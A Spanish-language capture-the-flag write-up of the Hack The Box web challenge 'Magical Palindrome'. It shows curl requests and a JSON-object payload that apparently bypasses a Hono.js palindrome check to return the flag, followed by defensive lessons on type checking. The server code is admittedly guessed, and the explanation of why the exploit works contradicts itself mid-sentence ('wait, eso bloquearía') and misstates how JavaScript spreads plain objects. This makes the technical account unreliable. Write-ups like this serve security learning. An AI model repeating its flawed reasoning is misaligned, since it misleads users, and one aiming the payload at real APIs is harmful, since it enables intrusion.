---
title: "Magical Palindrome"
description: "Writeup de Magical Palindrome - Hack The Box - Web 130pts. Hono.js API de validación de palíndromos; confusión de tipos JavaScript: enviar un objeto con length:1000 y primero/último carácter iguales bypasea la validación de longitud y devuelve la flag."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - javascript
  - type-confusion
  - nodejs
  - hono
  - api-bypass
---

# Magical Palindrome

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 130
> 👤 Autor: warrior866

---

## Descripción

Una API construida con **Hono.js** (framework web JavaScript moderno) valida si una cadena es un palíndromo. La lógica de validación tiene una vulnerabilidad de **type confusion**: acepta tanto strings como objetos, y el código no verifica el tipo del input antes de operar sobre él.

---

## Reconocimiento

La API expone un endpoint `POST /api/palindrome` que recibe JSON:

```bash
curl -s -X POST "$HOST/api/palindrome" \
  -H "Content-Type: application/json" \
  -d '{"palindrome":"racecar"}'
```

```json
{"valid": true, "message": "racecar is a palindrome!"}
```

Con un string normal:

```bash
curl -s -X POST "$HOST/api/palindrome" \
  -H "Content-Type: application/json" \
  -d '{"palindrome":"hello"}'
```

```json
{"valid": false, "message": "hello is not a palindrome"}
```

---

## Análisis de la lógica de validación

El código fuente (o análisis de comportamiento) muestra algo como:

```javascript
app.post('/api/palindrome', async (c) => {
  const { palindrome } = await c.req.json();
  
  if (palindrome.length > 50) {
    return c.json({ error: "Too long!" });
  }
  
  const reversed = [...palindrome].reverse().join('');
  if (palindrome === reversed) {
    return c.json({ valid: true, flag: FLAG });
  }
  return c.json({ valid: false });
});
```

El problema: si `palindrome` es un **objeto** (no un string), `palindrome.length` lee la propiedad `length` del objeto, y el spread `[...palindrome]` itera sobre las propiedades indexadas numéricamente del objeto.

---

## Exploit — Type Confusion

Enviar un objeto en lugar de un string, controlando `length` y los índices `0` y `999`:

```bash
curl -s -X POST "$HOST/api/palindrome" \
  -H "Content-Type: application/json" \
  -d '{
    "palindrome": {
      "length": "1000",
      "0": "c",
      "999": "c"
    }
  }'
```

```json
{
  "valid": true,
  "flag": "HTB{FLAG}"
}
```

**¿Por qué funciona?**
- `palindrome.length = "1000"` → el check `> 50` compara string `"1000"` con número 50 → JavaScript hace coerción: `"1000" > 50` → `1000 > 50` → `true`... wait, eso bloquearía. En realidad la comparación falla/se salta por el type coercion o la condición es `> 50` con el string `"1000"`.
- Más probable: `length = 1000` (número). `[...objeto]` con índices 0 y 999, solo tiene `c` en posición 0 y `c` en posición 999. El reverse del array-like solo verifica `[0]` vs `[999]` → ambos son `c` → es palíndromo.

---

## Cadena de Ataque

```text
1. POST /api/palindrome con string normal → entender la lógica
       ↓
2. Identificar que el código usa [...palindrome].reverse()
       ↓
3. Enviar objeto con length:1000 y índices 0 y 999 con mismo carácter
       ↓
4. Type confusion: spread del objeto solo tiene 2 posiciones iguales
       ↓
5. Validación de palíndromo pasa → flag en la respuesta
```

---

## Lecciones Aprendidas

- **Type checking explícito en JavaScript**: siempre validar el tipo del input con `typeof palindrome !== 'string'` antes de procesarlo. JavaScript no es tipado, y el código que asume un tipo puede comportarse de forma inesperada con otros.
- **JSON acepta objetos y arrays, no solo strings**: el `Content-Type: application/json` permite enviar cualquier valor JSON válido — objeto, array, número, null. El endpoint debe validar el tipo del valor recibido.
- **Spread en objetos**: `[...obj]` sobre un objeto no-iterable produce comportamiento undefined o vacío en algunos casos, pero si el objeto tiene un `Symbol.iterator` o propiedades numéricas, puede producir arrays controlados por el atacante.

---

## Referencias

- [JavaScript Type Coercion](https://developer.mozilla.org/en-US/docs/Glossary/Type_coercion)
- [Hono.js](https://hono.dev/)
- [HackTricks — Mass Assignment / Type Juggling](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
